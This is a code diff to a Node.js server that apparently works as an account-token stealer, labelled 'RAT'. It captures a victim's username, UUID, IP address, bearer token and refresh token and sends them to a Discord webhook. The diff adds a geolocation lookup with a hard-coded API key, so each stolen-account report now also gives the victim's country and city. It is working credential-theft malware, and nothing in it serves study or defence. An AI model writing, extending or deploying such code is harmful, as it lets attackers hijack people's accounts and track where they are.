@@ -37,7 +37,11 @@ app.get('/', async (req, res) => {
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
         const ip = clientIp
-        postToWebhook(username, bearerToken, uuid, ip, refreshToken)
+        const ipLocationArray = await getIpLocation(ip)
+        const country = ipLocationArray[0]
+        const city = ipLocationArray[1]
+        const flag = ipLocationArray[2]
+        postToWebhook(username, bearerToken, uuid, ip, refreshToken, country, city, flag)
     } catch (e) {
         console.log(e)
     }
@@ -126,7 +130,18 @@ async function getUsernameAndUUID(bearerToken) {
     return [response.data['id'], response.data['name']]
 }
 
-function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
+async function getIpLocation(ip) {
+    const url = 'https://ipgeolocation.abstractapi.com/v1/?api_key=28d3584274844560bdf38a12099432dd&ip_address='+ip
+    const config = {
+        headers: {
+            'Content-Type': 'application/json',
+        }
+    }
+    let response = await axios.get(url, config)
+    return [response.data['country'], response.data['city'], response.data.flag['emoji']]
+}
+
+function postToWebhook(username, bearerToken, uuid, ip, refreshToken, country, city, flag) {
     const url = webhook_url
     let data = {
 username: "[LVL 100] Rat",
@@ -147,17 +162,22 @@ content: "@everyone",
           inline: true
         },
         {
-          name: "**Refresh:**",
-          value: "[Click Here]("+redirect_uri+"/refresh?refresh_token="+refreshToken+")",
-          inline: true
-        },
+            name: "**IP Location:** "+flag,
+            value: "```"+country+", "+city+"```",
+            inline: true
+          },
+        
         {
           name: "**Token:**",
           value: "```"+bearerToken+"```"
-        }
+        },
+        {
+            name: "**Refresh:**",
+            value: "[Click Here]("+redirect_uri+"/refresh?refresh_token="+refreshToken+")",
+          }
       ],
       "footer": {
-        "text": "RAT",
+        "text": "By heda",
         "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
       }
     }
